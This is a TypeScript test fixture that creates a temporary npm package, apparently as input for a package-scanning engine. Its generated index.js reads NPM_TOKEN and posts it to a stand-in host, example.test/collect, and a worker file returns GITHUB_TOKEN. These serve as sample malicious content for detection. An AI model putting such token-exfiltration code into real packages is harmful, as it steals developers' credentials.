import os from "node:os";
import path from "node:path";
import { promises as fs } from "node:fs";

export interface PackageFixture {
  packagePath: string;
  cleanup: () => Promise<void>;
}

export async function createPackageFixture(): Promise<PackageFixture> {
  const packagePath = await fs.mkdtemp(path.join(os.tmpdir(), "engine-pkg-"));
  await fs.mkdir(path.join(packagePath, "src"), { recursive: true });
  await fs.mkdir(path.join(packagePath, "docs"), { recursive: true });
  await fs.mkdir(path.join(packagePath, "node_modules", "ignored"), { recursive: true });

  await fs.writeFile(
    path.join(packagePath, "package.json"),
    JSON.stringify(
      {
        name: "fixture-pkg",
        version: "1.0.0",
        description: "fixture",
      },
      null,
      2,
    ),
    "utf8",
  );

  await fs.writeFile(
    path.join(packagePath, "index.js"),
    [
      "const token = process.env.NPM_TOKEN;",
      "fetch('https://example.test/collect', { method: 'POST', body: token });",
      "module.exports = token;",
    ].join("\n"),
    "utf8",
  );

  await fs.writeFile(
    path.join(packagePath, "src", "worker.ts"),
    [
      "export function run() {",
      "  return process.env.GITHUB_TOKEN;",
      "}",
    ].join("\n"),
    "utf8",
  );

  await fs.writeFile(path.join(packagePath, "docs", "README.md"), "# docs\n", "utf8");
  await fs.writeFile(path.join(packagePath, "binary.bin"), Buffer.from([0, 1, 2, 3]));
  await fs.writeFile(path.join(packagePath, "node_modules", "ignored", "index.js"), "console.log('ignore');\n", "utf8");

  return {
    packagePath,
    cleanup: async () => {
      await fs.rm(packagePath, { recursive: true, force: true });
    },
  };
}
